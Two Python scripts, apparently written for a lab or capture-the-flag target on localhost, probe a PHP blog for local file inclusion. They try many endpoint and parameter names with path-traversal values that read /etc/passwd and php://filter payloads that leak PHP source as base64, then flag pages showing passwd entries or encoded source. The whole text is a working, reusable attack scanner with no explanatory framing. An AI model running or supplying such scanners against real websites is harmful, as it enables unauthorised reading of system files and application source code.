import urllib.request, urllib.parse, hashlib

base='http://localhost:80/'
endpoints=['index.php','about.php','contact.php','post.php']
params=['file','page','path','template','view','inc','include','lang','p','name','module','dir','folder','load','url','content','component','post','id']
# Two test values: benign (existing post), and LFI attempt
values=['posts/ScriptKiddie.php','../../../../etc/passwd','php://filter/convert.base64-encode/resource=index.php']

results=[]
for ep in endpoints:
    # baseline
    try:
        with urllib.request.urlopen(base+ep, timeout=5) as r:
            base_data=r.read()
            base_md5=hashlib.md5(base_data).hexdigest()
    except Exception as e:
        base_md5=None
    for k in params:
        for v in values:
            url=f"{base}{ep}?{urllib.parse.urlencode({k:v})}"
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    data=r.read()
                    md5=hashlib.md5(data).hexdigest()
            except Exception as e:
                md5='ERR'
            if md5!=base_md5:
                results.append((ep,k,v,md5))

print('DIFF RESULTS:')
for row in results:
    print(row)
print('TOTAL',len(results))

import urllib.request, urllib.parse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

base='http://localhost:80/'
endpoints=[
 'index.php','post.php','about.php','contact.php',
 'view.php','page.php','pages.php','router.php','route.php','load.php','render.php','show.php','content.php','include.php','inc.php','download.php','file.php','read.php','article.php','blog.php','theme.php','layout.php'
]
params=['file','page','path','template','view','inc','include','lang','p','name','module','dir','folder','load','url','content','component','post','id']

payloads=[
 ('php://filter/convert.base64-encode/resource=index.php','php_src'),
 ('../../../../etc/passwd','etc_passwd'),
 ('php://filter/convert.base64-encode/resource=post.php','post_src'),
]

hits=[]
for ep in endpoints:
    # baseline
    try:
        with urllib.request.urlopen(base+ep, timeout=4) as r:
            base_data=r.read(150000).decode('latin-1','ignore')
    except Exception as e:
        base_data=''
    for k in params:
        for v,label in payloads:
            url=f"{base}{ep}?{urllib.parse.urlencode({k:v})}"
            try:
                with urllib.request.urlopen(url, timeout=4) as r:
                    data=r.read(200000).decode('latin-1','ignore')
            except Exception as e:
                data=str(e)
            # detect likely inclusion success
            if 'root:x:' in data or 'daemon:x:' in data:
                hits.append((ep,k,label,url,'passwd_leak'))
            elif 'PD9waHA' in data or 'PD8' in data: # '<?php' base64
                hits.append((ep,k,label,url,'php_b64'))
            elif data!=base_data and 'Not Found' not in data and 'Post not found' not in data:
                # content changed significantly and not error; possible include
                if len(data) - len(base_data) > 200:
                    hits.append((ep,k,label,url,'diff'))

print('HITS:')
for h in hits:
    print(h)
print('TOTAL',len(hits))
